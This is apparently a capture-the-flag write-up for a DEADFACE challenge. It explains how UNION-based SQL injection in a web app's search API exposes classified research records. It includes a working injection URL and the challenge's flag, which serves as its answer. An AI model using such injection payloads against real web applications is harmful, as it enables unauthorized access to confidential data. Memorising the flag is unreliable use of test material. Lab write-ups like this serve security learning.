## **Challenge Name: classified**

### **Description**

NVU had confidential research data that was compromised by DEADFACE and leaked to the public. NVU insists that their confidential data was safeguarded and only provided to authorized users on the web app. See if you can identify the flag associated with the classified research present on the web application.

Submit the flag as deadface{flag text}.

**Challenge URL**: `http://env01.deadface.io:8080`

---

### **Approach**

1. **Initial Access**  
   - Already logged in as admin from the "accessGranted" challenge using SQL injection
   - Navigated to the search functionality

2. **SQL Injection in Search API**  
   - Found the search API endpoint: `/api/search.php`
   - Discovered it was vulnerable to SQL injection
   - Used UNION-based SQL injection to enumerate columns:
     ```
     http://env01.deadface.io:8080/api/search.php?q=%25%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%20--%20-&type=research
     ```

3. **Extracting Research Data**  
   - The SQL injection returned research projects including classified ones
   - Found the flag in one of the research project details:
     ```json
     {
         "project_name": "Neural Interface Technology",
         "lead_researcher": "Dr. Patricia Wong",
         "details": "FLAG: deadface{cl4ss1f13d_r3s34rch_unh4ck4bl3} - Advanced brain-computer interface development with military applications",
         "funding_amount": "5000000.00"
     }
     ```

---

### **Flag**

```
deadface{cl4ss1f13d_r3s34rch_unh4ck4bl3}
```

---

